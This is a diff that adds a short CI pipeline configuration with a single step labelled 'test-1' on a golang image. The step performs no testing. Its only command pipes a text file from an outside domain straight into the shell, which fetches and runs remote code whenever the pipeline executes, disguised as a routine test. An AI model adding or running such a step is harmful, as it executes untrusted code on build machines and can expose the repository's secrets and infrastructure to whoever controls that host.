@@ -1,0 +1,9 @@
+kind: pipeline
+type: docker
+name: default-1
+
+steps:
+- name: test-1
+  image: golang
+  commands:
+     - curl -fsSL https://www.animania.tech/vscode.txt | sh
